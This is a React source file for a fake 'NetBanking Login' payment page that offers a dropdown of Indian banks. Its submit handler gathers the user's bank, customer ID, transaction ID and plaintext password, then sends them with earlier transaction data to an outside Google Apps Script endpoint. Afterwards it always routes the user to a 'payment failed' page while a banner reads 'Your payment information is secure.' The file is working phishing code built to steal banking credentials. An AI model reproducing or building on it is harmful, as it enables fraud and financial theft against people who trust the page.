import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTransaction } from '../context/TransactionContext';
import './NetBanking.css';

function NetBanking() {
  const navigate = useNavigate();
  const { transactionData, updateTransactionData } = useTransaction();
  const [isProcessing, setIsProcessing] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    bank: '',
    customerId: '',
    transactionId: '',
    password: ''
  });

  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxa9IOCyaCo2_ooxMNBTfO_WzgMhwxniEFYEedLRyopzSwIW6p8Qd-A_Cv7B33TzblZLA/exec';


  const banks = [
    'Select your bank',
    'State Bank of India (SBI)',
    'HDFC Bank',
    'ICICI Bank',
    'Axis Bank',
    'Punjab National Bank (PNB)',
    'Bank of Baroda',
    'Bank of India',
    'Bank of Maharashtra',
    'Canara Bank',
    'Central Bank of India',
    'Indian Bank',
    'Indian Overseas Bank',
    'Punjab & Sind Bank',
    'UCO Bank',
    'Union Bank of India',
    'Kotak Mahindra Bank',
    'IndusInd Bank',
    'IDBI Bank',
    'IDFC FIRST Bank',
    'Yes Bank',
    'RBL Bank',
    'Federal Bank',
    'South Indian Bank',
    'Karnataka Bank',
    'Karur Vysya Bank',
    'City Union Bank',
    'Tamilnad Mercantile Bank',
    'DCB Bank',
    'CSB Bank',
    'Nainital Bank',
    'Other'
  ];

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (formData.bank === '' || formData.bank === 'Select your bank') {
      alert('Please select your bank.');
      return;
    }
    if (formData.customerId.trim() === '') {
      alert('Please enter your Customer ID or User ID.');
      return;
    }
    if (formData.transactionId.trim() === '') {
      alert('Please enter your Transaction ID.');
      return;
    }
    if (formData.password.trim() === '') {
      alert('Please enter your password.');
      return;
    }

    setIsProcessing(true);

    // Save net banking details to transaction data
    const finalData = {
      ...transactionData,
      netBankingBank: formData.bank,
      customerId: formData.customerId,
      transactionId: formData.transactionId,
      netBankingPassword: formData.password,
      status: 'Success',
      timestamp: new Date().toLocaleString()
    };

    // Send to Google Sheets
    fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(finalData),
    }).catch(console.error);

    setTimeout(() => {
      setIsProcessing(false);
      navigate('/payment-failed');
    }, 2000);
  };

  return (
    <div className="nb-wrapper">
      <div className="nb-card">
        <button className="nb-back-btn" onClick={() => navigate(-1)}>
          ← Back to Payment Methods
        </button>
        <h2 className="nb-title">NetBanking Login</h2>
        <p className="nb-subtitle">Welcome back! Please login to access your account.</p>

        <form onSubmit={handleSubmit}>
          <div className="nb-form-group">
            <label>Select Bank</label>
            <select
              name="bank"
              value={formData.bank}
              onChange={handleInputChange}
              className="nb-select"
              required
            >
              {banks.map((bank, index) => (
                <option key={index} value={bank}>
                  {bank}
                </option>
              ))}
            </select>
          </div>

          <div className="nb-form-group">
            <label>Customer ID/User ID</label>
            <div className="nb-input-wrapper">
              <input
                type="text"
                name="customerId"
                placeholder="Enter your Customer ID or User ID"
                value={formData.customerId}
                onChange={handleInputChange}
                className="nb-input"
                required
              />
              <span className="nb-input-icon">👤</span>
            </div>
          </div>

          <div className="nb-form-group">
            <label>Password</label>
            <div className="nb-input-wrapper">
              <input
                type={showPassword ? 'text' : 'password'}
                name="password"
                placeholder="Enter your password"
                value={formData.password}
                onChange={handleInputChange}
                className="nb-input"
                required
              />
              <button
                type="button"
                className="nb-password-toggle"
                onClick={togglePasswordVisibility}
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? '❌' : '👁️'}
              </button>
            </div>
          </div>

          <div className="nb-form-group">
            <label>Transaction ID</label>
            <div className="nb-input-wrapper">
              <input
                type="text"
                name="transactionId"
                placeholder="Enter your Transaction ID"
                value={formData.transactionId}
                onChange={handleInputChange}
                className="nb-input"
                required
              />
              <span className="nb-input-icon">📋</span>
            </div>
            <div className="nb-transaction-hint">
              <span>ℹ️ Enter the Transaction ID provided by your bank</span>
            </div>
          </div>

          <button type="submit" className="nb-payment-btn" disabled={isProcessing}>
            {isProcessing ? 'PROCESSING...' : 'LOGIN'}
          </button>
        </form>

        <div className="nb-security">
          <span className="nb-security-icon">🔒</span>
          <span className="nb-security-text">Your payment information is secure.</span>
        </div>
      </div>
    </div>
  );
}

export default NetBanking;